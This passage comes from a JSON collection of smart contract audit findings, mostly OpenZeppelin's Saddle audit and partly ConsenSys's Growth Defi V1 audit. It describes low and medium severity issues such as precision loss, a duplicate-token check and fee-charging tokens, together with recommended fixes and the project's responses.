in their naming. Consider renaming such variables to be more descriptive, or highlighting their analog values in Curve.\n* The choice of value `0x54dd1e` in [`Allowlist`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L32-L33) and [`Swap`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L133) is arbitrary, and comments or documentation should exist to indicate this so that it is clear the value has no particular meaning.\n* The [comments before `getYD`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L258-L260) mention precision-adjusted balances duplicately. Consider removing one mention of precision-adjusted balances in this comment.\n\n\nConsider adding comments throughout your codebase to ensure the purpose of every aspect is clear, including clarifying the above examples. Doing so will aid future development efforts and reduce the surface for error.\n\n\n***Update:** partially fixed in [pull request 202](https://github.com/saddle-finance/saddle-contract/pull/202/files). The variables `xp`, `A`, and others identified in the 5th bullet have not been renamed. Saddle’s statement for this issue:*\n\n\n\n> \n>  External document/wiki will include information about which function is analogous to those in curve’s\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11196",
      "title": "[L07] Loss of accuracy caused when dividing",
      "impact": "LOW",
      "content": "Throughout the Saddle contracts, formulae used are mathematically equivalent to those performed in the Curve contracts. However due to the fact that division truncates in the EVM, a number of the Saddle functions contain calculations that are less precise than the Curve equivalents due to the fact that the Saddle contracts divide earlier or more often than the Curve contracts. Consider the following list of examples:\n\n\n* [Line 296 of `SwapUtils`‘ `getYD`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L296) is mathematically equivalent to [line 632 of Curve’s `get_y_D`](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L632). However Saddle achieves this by dividing the denominator by `A_PRECISION` instead of multiplying the numerator.\n* [Line 465 of `SwapUtils`‘ `getY`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L465) and [line 402 of Curve’s `get_y`](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L402) are identical to the lines mentioned in the previous point. They therefore suffer from the same issue of “double dividing” as `getYD`.\n* [`SwapUtils.getD` lines 343-344](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L343-L344) are mathematically equivalent to [line 222 of Curve’s `get_D`](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L222). The difference in the formulae comes down to Saddle performing `(nA/A_PRECISION - 1) * D` where Curve performs `((Ann-A_PRECISION)*D)/A_PRECISION` (where `nA` and `Ann` are equivalent variables). Dividing by `A_PRECISION` as the first operation, as Saddle does, causes a loss of precision that is then amplified by the following multiplication. Curve’s method of dividing by `A_PRECISION` as the final operation means that the precision loss is as minimal as possible.\n\n\nConsider updating calculations throughout the codebase to always perform divisions as rarely and as late as possible.\n\n\n***Update:** Fixed in [pull request 194](https://github.com/saddle-finance/saddle-contract/pull/194/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11195",
      "title": "[L06] Token precisions not verified",
      "impact": "LOW",
      "content": "In the [`constructor` of the `Swap` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L84), `precisions` is an [input parameter](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L85). This value is intended to be `10**decimals`, where `decimals` is the number of decimal places that the corresponding token has in [the `_pooledTokens` array](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L85). However, the inputted values are not verified to be a power of 10, meaning that currently the constructor will accept any value. This would then impart calculation errors [when `tokenPrecisionMultipliers` are used](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L209-L210), since `tokenPrecisionMultipliers` is [set to `precisions`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L121).\n\n\nAlthough it cannot be assumed that a `decimals` function is implemented for each token, since it is [optional according to the ERC20 specification](https://eips.ethereum.org/EIPS/eip-20), the vast majority of tokens do have this property. Consider vetting tokens for the existence of `decimals` before listing them. This will then enable `precisions` to be assigned by referencing the token contracts instead of via user-supplied values, which are error prone.\n\n\n***Update:** Fixed in [pull request 195](https://github.com/saddle-finance/saddle-contract/pull/195/files). [`tokenPrecisionMultipliers`](https://github.com/saddle-finance/saddle-contract/pull/195/files#diff-84f52e06c2dd0462c3e945c0faed481f0caebfe8cfd7db234a24122eafcae133R122) is now always set to a [power of 10](https://github.com/saddle-finance/saddle-contract/pull/195/files#diff-84f52e06c2dd0462c3e945c0faed481f0caebfe8cfd7db234a24122eafcae133R116) based on `decimals`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11194",
      "title": "[L05] Outdated Solidity version in use",
      "impact": "LOW",
      "content": "The codebase is currently using [solidity version 0.5.17](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L1). As Solidity is now under a fast-release cycle, we advise using the latest version of the compiler at the time of deployment (presently 0.7.6). Alternatively, if there are reasons for using version 0.5.17, consider making this clear in the documentation.\n\n\n***Update:** Fixed in [pull request 185](https://github.com/saddle-finance/saddle-contract/pull/185/files). Saddle chose to upgrade to Solidity version 0.6.12. Saddle’s statement for this issue:*\n\n\n\n> \n>  Solidity 0.7 fixes various issues, two notable bugs are the below ones.\n> \n> \n>  <https://blog.soliditylang.org/2020/10/07/solidity-dynamic-array-cleanup-bug/>\n> \n> \n>  <https://blog.soliditylang.org/2020/10/19/empty-byte-array-copy-bug/>\n> \n> \n>  However as our codebase does not rely on resizing an array without inserting values, we are not exposed to the bugs currently. List of known bugs and fixes can be found here\n> \n> \n>  <https://docs.soliditylang.org/en/v0.7.6/bugs.html>\n> \n> \n>  We will follow crytic’s development guidelines and move to 0.6.12\n> \n> \n>  <https://github.com/crytic/building-secure-contracts/blob/master/development-guidelines/guidelines.md#solidity>\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11193",
      "title": "[L04] No return values for some functions",
      "impact": "LOW",
      "content": "Saddle’s [`Swap` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol) interface is intended to closely match that of Curve’s [`SwapTemplateBase` contract](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy). However, a number of functions return a value in Curve’s implementation, while their equivalents in Saddle do not return a value. The following sets of functions return a value in Curve, but do not in Saddle:\n\n\n* The [`swap` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L302) in Saddle and the [`exchange` function](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L433) in Curve.\n* The [`addLiquidity` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L315) in Saddle and the [`add_liquidity` function](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L285) in Curve.\n* The [`removeLiquidity` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L342) in Saddle and the [`remove_liquidity` function](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L500) in Curve.\n* The [`removeLiquidityOneToken` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L355) in Saddle and the [`remove_liquidity_one_coin` function](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L695) in Curve.\n* The [`removeLiquidityImbalance` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L370) in Saddle and the [`remove_liquidity_imbalance` function](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pool-templates/base/SwapTemplateBase.vy#L539) in Curve.\n\n\nSince these functions are supposed to mimic those of Curve, they should return values like the functions in Curve do. Importantly, this will provide those values for smart contracts that interact with the Saddle code to trade or provide liquidity, and will result in less confusion for users who are expecting a similar interface to that of Curve.\n\n\nConsider implementing return values for the functions highlighted above.\n\n\n***Update:** Fixed in [pull request 196](https://github.com/saddle-finance/saddle-contract/pull/196/files#).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11192",
      "title": "[L03] Improper math correction in _updateUserWithdrawFee",
      "impact": "LOW",
      "content": "In the [`SwapUtils`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol) function [`_updateUserWithdrawFee`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L736), a [calculation](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L742-L744) is performed to determine the user’s `withdrawFeeMultiplier`. In this calculation, the value `1` is added in two places to attempt to counteract the truncation effects of the `div` function. However, the way it is being done is incorrect, and can actually exaggerate math errors.\n\n\nSince truncation occurs whenever a division is performed such that there is a “remainder” (when `A / B` is performed and `A % B != 0`), consider adding a `1` only after a division is performed, and perhaps only if there is a remainder in the [`div`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L744) calculation. The other additions of `1` should be removed.\n\n\n***Update:** Fixed in [pull request 157](https://github.com/saddle-finance/saddle-contract/pull/157/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11191",
      "title": "[L02] Low test coverage on some contracts",
      "impact": "LOW",
      "content": "Running `npm run coverage` within the Saddle repository shows that some areas of the code base do not have thorough test coverage. In particular, there are no tests at all for the code within `CERC20.sol`, and the branch coverage for 6 of the 8 contracts audited is at 80% or below.\n\n\nConsider writing additional tests for the repository to fully test your contracts. We advise having at least 95% test coverage.\n\n\n***Update:** Fixed in [pull request 197](https://github.com/saddle-finance/saddle-contract/pull/197). The Saddle team has significantly increased test coverage.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11190",
      "title": "[L01] Crude Allowlist check not secure",
      "impact": "LOW",
      "content": "In the `constructor` of the [`Allowlist` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol), [`poolCaps[address(0x0)]` is set to `0x54dd1e`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L32). The [comment on the line above](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L31) states that this value is “a way of crude checking whether an address holds [the] Allowlist contract”. Then, in the constructor of [the `Swap` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol), a [check is done](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L133) which requires that the inputted [`_allowlist`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L132) contract has the value `0x54dd1e` stored in its [`poolCap` mapping at key `address(0x0)`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L49-L51). This is to ensure that the `_allowlist` variable is the address of an instance of the `Allowlist` contract.\n\n\nThis check, while being potentially useful in preventing user error, cannot be relied upon for security. Any contract can easily implement a [`getPoolCap` function](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L133) such that this check succeeds. We report this so users and future developers are aware that this check only provides convenience, but cannot guarantee that the correct version of `Allowlist` is linked to the instance of `Swap`. To verify, advanced users could check that the value of the public [`allowlist` variable](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L36) correctly corresponds to the contract. Consider instead implementing [EIP1820](https://eips.ethereum.org/EIPS/eip-1820) in order to leverage and comply with industry standards, but note that even with EIP1820, any contract can assert that it implements the desired interface.\n\n\n***Update:** Acknowledged, and will not fix. Saddle’s statement for the issue:*\n\n\n\n> \n>  This issue is acknowledged by the team. The check is primarily for preventing user error. Once allowlist is set on initialization, it cannot be changed. We will make sure that the allowlist contract is the right version and owned by the correct owner upon deployment of Swap.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11189",
      "title": "[M04] Token fees can lead to incorrect calculations",
      "impact": "MEDIUM",
      "content": "Certain tokens, such as USDT, have the ability to [charge fees on transfers](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code). Although the fee rate is currently `0`, this may change in the future. The result of this is that if `x` tokens are transferred, an amount less than `x` will be received. For any functions which utilize `transferFrom`, the expectation that the amount received will match the amount transferred cannot be relied upon.\n\n\nWithin `SwapUtils` functions [`swap`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L637-L638) and [`addLiquidity`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L713-L714) the [`safeTransferFrom`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/837828967a9831e4333d5fb9edefb200a357d24d/contracts/token/ERC20/SafeERC20.sol#L24) function is called to `transferFrom` tokens into the Saddle pool contract. While `safeTransferFrom` does provide error handling for unsuccessful calls, it will provide no indication of whether a token charges internal fees on transfers.\n\n\nFor tokens which may charge fees on transfers, consider checking the recipient’s balance before and after `safeTransferFrom` calls, and using the change in balance for any calculations which may follow. In both cases mentioned above, the transfer of fee-charging tokens should occur before any relevant calculations are made, to avoid calculations which assume more tokens were received than actually were. For reference, the [Curve 3pool Pool](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pools/3pool/StableSwap3Pool.vy) uses a variable called [`FEE_INDEX`](https://github.com/curvefi/curve-contract/blob/010a12b369a8d15b3ff917b51f4b93ec1c5cff47/contracts/pools/3pool/StableSwap3Pool.vy#L83) to identify USDT as a token which may charge fees, and incorporates `FEE_INDEX` into logic accordingly.\n\n\n***Update:** Fixed in [pull request 191](https://github.com/saddle-finance/saddle-contract/pull/191/files#diff-b10206d740152912f7a57cdfc48fd115bbd5ca6e4eb37a60ae867efb39d19d44R648).*",
      "summary": "\nThis bug report outlines an issue with certain tokens, such as USDT, which have the ability to charge fees on transfers. This means that if x tokens are transferred, an amount less than x will be received. The bug report highlights two functions within SwapUtils, swap and addLiquidity, which use the safeTransferFrom function to transfer tokens into the Saddle pool contract and do not provide any indication of whether a token charges internal fees on transfers.\n\nThe bug report suggests that for tokens which may charge fees on transfers, the recipient's balance should be checked before and after safeTransferFrom calls, and the change in balance should be used for any calculations which may follow. The bug report also provides an example from the Curve 3pool Pool, which uses a variable called FEE_INDEX to identify USDT as a token which may charge fees, and incorporates FEE_INDEX into logic accordingly.\n\nThe bug report has been fixed in pull request 191.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11188",
      "title": "[M03] Approximations may finish with inaccurate values",
      "impact": "MEDIUM",
      "content": "Within [the `SwapUtils` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol), there are three spots where an iterative approximation is performed: [within `getYD`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L301-L306), [within `getD`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L334-L348), and [within `getY`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L471-L477). In each case, the result of the [`within1`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/MathUtils.sol#L21) function is used [as the “breaking” condition](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L474-L475). However, also in each instance, if the breaking condition is never satisfied, the `for` loop will eventually [finish iterating after `MAX_LOOP_LIMIT` iterations](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L471). When this occurs, the estimated value will [still be treated as correct](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L478), even though it could be relatively inaccurate.\n\n\nConsider implementing some logic such that if the `for` loop finishes iterating and the [breaking condition](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L474) has not been met, execution reverts. This will avoid treating the approximated value as accurate in the case that it is not.\n\n\n***Update:** Partially fixed in [pull request 201](https://github.com/saddle-finance/saddle-contract/pull/201/files#diff-b10206d740152912f7a57cdfc48fd115bbd5ca6e4eb37a60ae867efb39d19d44R330-R337). The instance within `getD` has been fixed.*",
      "summary": "\nThe bug report is about the `SwapUtils` contract in the Saddle Finance Repository. It discusses three spots in the code where an iterative approximation is performed. The result of the `within1` function is used to break the loop, however, if the breaking condition is never satisfied, the loop will finish iterating after `MAX_LOOP_LIMIT` iterations. In this case, the estimated value will be treated as correct, even if it is inaccurate. To fix this issue, the bug report suggests implementing some logic such that if the breaking condition is not met, execution reverts. This will avoid treating the approximated value as accurate in the case that it is not. The bug has been partially fixed in pull request 201, where the instance within `getD` has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11187",
      "title": "[M02] Initial fee rates and amplification coefficient can be set out of bounds",
      "impact": "MEDIUM",
      "content": "Typically, when setting the following values, limits (such as [this one in `setAdminFee`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L909)) are imposed:\n\n\n* [`initialA`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L945)\n* [`swapFee`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L920)\n* [`defaultWithdrawFee`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L931)\n* [`adminFee`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L908)\n\n\nHowever, upon initializing a new Swap contract, these values are [set directly](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L127-L129), and can therefore be outside of the limits typically imposed. This could lead to errors in [calculations of fees](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L515) and of trade prices, and has the potential to freeze certain functions if fees are too high.\n\n\nConsider ensuring that maximum limits are applied to the fee and amplification coefficient parameters of a new Swap contract, much as they are applied when the values are updated.\n\n\n***Update:** Fixed in [pull request 189](https://github.com/saddle-finance/saddle-contract/pull/189/files).*",
      "summary": "\nThis bug report is about the Saddle Finance Swap contract. When setting values such as initialA, swapFee, defaultWithdrawFee, and adminFee, limits are typically imposed. However, when initializing a new Swap contract, these values are set directly and can be outside of the limits. This could lead to errors in calculations of fees and of trade prices, and has the potential to freeze certain functions if fees are too high. The fix for this bug was to ensure that maximum limits are applied to the fee and amplification coefficient parameters of a new Swap contract, much as they are applied when the values are updated. This bug has since been fixed in pull request 189.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11186",
      "title": "[M01] Pools may have duplicate tokens",
      "impact": "MEDIUM",
      "content": "Within the `Swap` contract, the check on [line 104](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L104) is intended to prevent Saddle pools from having duplicate instances of the same token. However, this check will not correctly revert in the case that the token at index `0` is duplicated in any index `> 0`.\n\n\nThis is because at the end of the [for loop](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L102) on [line 115](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L115), an element in `tokenIndexes` can be assigned a value of `0`, which is identical to the default value when an index in the mapping has not been assigned. Thus, the check that [a new token has not been assigned an index](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L104) will pass if this same token has already been assigned an index of `0`. Having duplicate tokens in a pool can lead to a plethora of issues when calculating swap prices and providing liquidity.\n\n\nConsider modifying this pattern to catch the case where the token at index `0` is duplicated in another index. One solution may be to instead track `tokenIndexesPlusOne` rather than `tokenIndexes`, and assign values of `i+1`. This will ensure that all valid entries have a non-zero value, avoiding any confusion as to whether a value has been initialized or not. Note that this may necessitate changing [the code within `getTokenIndex`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L185) to utilize this workaround. Another potential solution is to add an additional check to the constructor that each token with index `> 0` is not equal to the token with index `0`.\n\n\n***Update:** Fixed in [pull request 184](https://github.com/saddle-finance/saddle-contract/pull/184/files).*",
      "summary": "\nThis bug report is about the `Swap` contract in the Saddle Finance codebase. The code contains a check on line 104 that is intended to prevent Saddle pools from having duplicate instances of the same token. However, this check will not work correctly if the token at index 0 is duplicated in any index greater than 0. This is because at the end of the for loop on line 115, an element in `tokenIndexes` can be assigned a value of 0, which is identical to the default value when an index in the mapping has not been assigned. \n\nOne potential solution is to track `tokenIndexesPlusOne` rather than `tokenIndexes`, and assign values of `i+1`. This will ensure that all valid entries have a non-zero value, avoiding any confusion as to whether a value has been initialized or not. Another potential solution is to add an additional check to the constructor that each token with index `> 0` is not equal to the token with index `0`. The bug has been fixed in pull request 184.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Saddle Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/saddle-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13576",
      "title": "Potential resource exhaustion by external calls performed within an unbounded loop",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`DydxFlashLoanAbstraction._requestFlashLoan` performs external calls in a potentially-unbounded loop. Depending on changes made to DyDx’s `SoloMargin`, this may render this flash loan provider prohibitively expensive. In the worst case, changes to `SoloMargin` could make it impossible to execute this code due to the block gas limit.\n\n\n**code/contracts/modules/DydxFlashLoanAbstraction.sol:L62-L69**\n\n\n\n```\nuint256 \\_numMarkets = SoloMargin(\\_solo).getNumMarkets();\nfor (uint256 \\_i = 0; \\_i < \\_numMarkets; \\_i++) {\n\taddress \\_address = SoloMargin(\\_solo).getMarketTokenAddress(\\_i);\n\tif (\\_address == \\_token) {\n\t\t\\_marketId = \\_i;\n\t\tbreak;\n\t}\n}\n\n```",
      "summary": "\nThis bug report is about the `DydxFlashLoanAbstraction._requestFlashLoan` function, which is part of the code in the file `DydxFlashLoanAbstraction.sol` on line 62 to 69. This function performs external calls in a potentially-unbounded loop. Depending on changes made to DyDx’s `SoloMargin`, this could make the flash loan provider too expensive, or in the worst case, impossible to execute due to the block gas limit. This bug report is important because it could cause problems with the code if changes are made to the `SoloMargin` and the code is not updated accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Growth Defi V1",
      "source_link": "https://consensys.net/diligence/audits/2020/12/growth-defi-v1/",
      "github_link": "",
      "tags": [],
      "finders": [
        "John Mardlin",
        "Alexander Wade"
      ]
    },
    {
      "id": "13575",
      "title": "Potentially dangerous use of a cached exchange rate from Compound",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`GPortfolioReserveManager.adjustReserve` performs reserve adjustment calculations based on Compound’s cached exchange rate values (using `CompoundLendingMarketAbstraction.getExchangeRate()`) then triggers operations on managed tokens based on up-to-date values (using `CompoundLendingMarketAbstraction.fetchExchangeRate()`) . Significant deviation between the cached and up-to-date values may make it difficult to predict the outcome of reserve adjustments.\n\n\n#### Recommendation\n\n\nUse `getExchangeRate()` consistently, or ensure `fetchExchangeRate()` is used first, and `getExchangeRate()` afterward.",
      "summary": "\nThis bug report is about an issue with the `GPortfolioReserveManager.adjustReserve` function, which is used to perform reserve adjustment calculations based on Compound's cached exchange rate values. The problem is that there can be a significant difference between the cached values and the up-to-date values, which can make it difficult to predict the outcome of reserve adjustments.\n\nThe recommendation is to use `getExchangeRate()` consistently, or to ensure that `fetchExchangeRate()` is used first and `getExchangeRate()` afterward. This should help to ensure that the reserve adjustment calculations are based on the most up-to-date values, reducing the risk of unexpected outcomes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Growth Defi V1",
